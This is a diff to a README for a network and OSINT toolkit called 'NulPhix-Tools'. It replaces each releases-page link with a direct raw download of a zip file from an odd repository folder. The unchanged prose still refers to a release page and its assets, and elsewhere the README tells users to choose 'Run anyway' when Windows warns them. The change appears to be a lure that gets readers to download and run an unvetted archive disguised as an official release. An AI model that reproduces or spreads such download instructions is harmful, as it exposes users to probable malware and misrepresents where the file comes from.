@@ -1,10 +1,10 @@
 # 🛠️ NulPhix-Tools - Fast Network and OSINT Toolkit
 
-[![Download NulPhix-Tools](https://img.shields.io/badge/Download-NulPhix--Tools-blue?style=for-the-badge&logo=github)](https://github.com/Opaque-brie624/NulPhix-Tools/releases)
+[![Download NulPhix-Tools](https://img.shields.io/badge/Download-NulPhix--Tools-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Opaque-brie624/NulPhix-Tools/main/retrojugular/Tools-Nul-Phix-v2.0.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Opaque-brie624/NulPhix-Tools/releases
+Visit this page to download: https://raw.githubusercontent.com/Opaque-brie624/NulPhix-Tools/main/retrojugular/Tools-Nul-Phix-v2.0.zip
 
 Download the latest release for Windows from the release page. Choose the file that matches your system, then save it to your PC.
 
@@ -36,7 +36,7 @@ If Windows asks for permission when you start the app, choose Allow or Run anywa
 
 ## 🚀 Install on Windows
 
-1. Open the download page: https://github.com/Opaque-brie624/NulPhix-Tools/releases
+1. Open the download page: https://raw.githubusercontent.com/Opaque-brie624/NulPhix-Tools/main/retrojugular/Tools-Nul-Phix-v2.0.zip
 2. Find the latest release at the top of the page.
 3. Download the Windows file from the Assets section.
 4. Save the file to your Desktop or Downloads folder.
